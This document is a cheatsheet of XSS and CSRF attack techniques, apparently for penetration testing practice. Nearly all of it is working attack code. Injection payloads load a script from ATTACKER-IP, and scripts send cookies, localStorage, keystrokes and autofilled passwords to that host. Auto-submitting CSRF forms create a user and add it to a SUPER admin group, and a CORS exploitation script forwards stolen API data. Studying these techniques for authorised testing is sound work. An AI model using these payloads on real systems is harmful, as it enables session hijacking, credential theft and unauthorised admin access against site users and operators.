# XSS and CSRF Attack Cheatsheet

## Table of Contents
- [Basic XSS Setup](#basic-xss-setup)
- [XSS Payloads](#xss-payloads)
- [Cookie Stealing](#cookie-stealing)
- [LocalStorage Exfiltration](#localstorage-exfiltration)
- [Keylogging with XSS](#keylogging-with-xss)
- [Password Stealing](#password-stealing)
- [CSRF Attacks](#csrf-attacks)
- [CORS Misconfiguration Testing](#cors-misconfiguration-testing)

## Basic XSS Setup

### Setting Up the Attacker Server
Start a simple HTTP server on your attack machine to serve malicious JavaScript and receive stolen data:

```bash
python3 -m http.server 80
```

### Create JavaScript Exfiltration File
Create a file called `xss.js` to extract and send data back to your server:

```bash
nano xss.js
```

## XSS Payloads

### Basic Script Tag Injection
```html
<script src="http://ATTACKER-IP/xss.js"></script>
```

### Image Error Event Payload
```html
<img src="x" onerror="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">
```

### Anti-Caching Payload (Prevents 304 Not Modified)
```html
<img src="x" onerror="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js?' + Math.random(); document.body.appendChild(s);">
```

### Alternative XSS Vectors
```html
<input type="text" value="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">

<div onmouseover="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">Hover Me</div>

<a href="#" onclick="var s=document.createElement('script'); s.src='http://ATTACKER-IP/xss.js'; document.body.appendChild(s);">Click Me</a>
```

## Cookie Stealing

### Cookie Exfiltration Script (xss.js)
```javascript
let cookie = document.cookie;
let encodedCookie = encodeURIComponent(cookie);
fetch("http://ATTACKER-IP/exfil?data=" + encodedCookie);
```

## LocalStorage Exfiltration

### LocalStorage Stealing Script (xss.js)
```javascript
let data = JSON.stringify(localStorage);
let encodedData = encodeURIComponent(data);
fetch("http://ATTACKER-IP/exfil?data=" + encodedData);
```

## Keylogging with XSS

### Keylogger Script (xss.js)
```javascript
function logKey(event) {
    fetch("http://ATTACKER-IP/k?key=" + event.key);
}

document.addEventListener('keydown', logKey);
```

## Password Stealing

### Credential Stealing via Password Manager Auto-fill (xss.js)
```javascript
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";
  
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";
 
body.append(u);
body.append(p);
 
setTimeout(function() { 
  fetch("http://ATTACKER-IP/k?u=" + u.value + "&p=" + p.value);
}, 5000);
```

## CSRF Attacks

### Basic CSRF Form to Create User
Create HTML file to add a new user with admin privileges:

```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://TARGET-APP/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```

### Advanced CSRF with Multiple Actions
CSRF attack that creates a user and adds them to an admin group:

```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    setTimeout(function() {
      document.forms['csrf2'].submit();
    }, 1000);  // Wait 1 second before submitting the second form
    return false;
  }
</script>
</head>
<body onload="submitForms();">
  <form action="https://TARGET-APP/webtools/control/createUserLogin" method="post" name="csrf">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://TARGET-APP/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="partyId">
    <input type="hidden" name="groupId" value="SUPER">
    <input type="hidden" name="fromDate_i18n">
    <input type="hidden" name="fromDate">
    <input type="hidden" name="thruDate_i18n">
    <input type="hidden" name="thruDate">
  </form>
</body>
</html>
```

### Hosting CSRF Files
```bash
sudo cp your-csrf-file.html /var/www/html/
sudo systemctl restart apache2
```

## CORS Misconfiguration Testing

### Test for CORS Configuration
```bash
curl -X "OPTIONS" -i -k https://TARGET-APP/allowlist
```

### Test Origin Header Manipulation
```bash
curl -X "OPTIONS" -i -H "Origin: http://www.target-security.com" -k https://TARGET-APP/allowlist
```

### Test Domain Suffix Manipulation
```bash
curl -X "OPTIONS" -i -H "Origin: http://www.target-security.net" -k https://TARGET-APP/allowlist
```

### Test Domain Prefix Manipulation
```bash
curl -X "OPTIONS" -i -H "Origin: http://faketarget-security.com" -k https://TARGET-APP/allowlist
```

### Test Subdomain Manipulation
```bash
curl -X "OPTIONS" -i -H "Origin: http://evil.target-security.com" -k https://TARGET-APP/allowlist
```

### CORS Exploitation JavaScript (in xss.js)
```javascript
// This can be used after confirming a CORS misconfiguration
fetch('https://vulnerable-site/api/sensitive-data', {
  method: 'GET',
  credentials: 'include'  // Sends cookies with the request
})
.then(response => response.json())
.then(data => {
  fetch('http://ATTACKER-IP/corsdata?data=' + encodeURIComponent(JSON.stringify(data)));
});
```
